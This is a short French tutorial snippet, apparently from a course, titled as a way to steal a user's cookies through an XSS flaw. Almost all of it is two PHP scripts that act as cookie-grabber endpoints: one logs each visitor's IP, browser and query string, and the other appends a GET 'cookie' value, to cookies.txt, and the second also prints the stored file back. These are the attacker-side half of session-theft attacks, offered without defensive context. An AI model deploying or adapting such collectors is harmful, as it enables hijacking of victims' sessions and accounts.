
Recuperer les cookies d'un utilisateur attraver une faille XSS

```php
<?php
$fichier = "cookies.txt";
function ejtp($fichier){
    $ip = $_SERVER['REMOTE_ADDR'];
    $browser = $_SERVER['HTTP_USER_AGENT'];

    $fp = fopen($fichier, 'a');
    fwrite($fp, $ip." ".$browser. "\n");
    fwrite($fp, urldecode($_SERVER['QUERY_STRING'])."\n\n");
    fclose($fp);
}
ejtp($fichier);
?>
```



```php
<?php
$fichier = "cookies.txt";
function alphorm_code_update($fichier){
    if(isset($_GET['cookie'])){
        file_put_contents($fichier, $_GET['cookie'].PHP_EOL, FILE_APPEND);
        echo "Ligne ajouter";
    }
    echo file_get_contents($fichier);
}
alphorm_code_update($fichier);
?>
```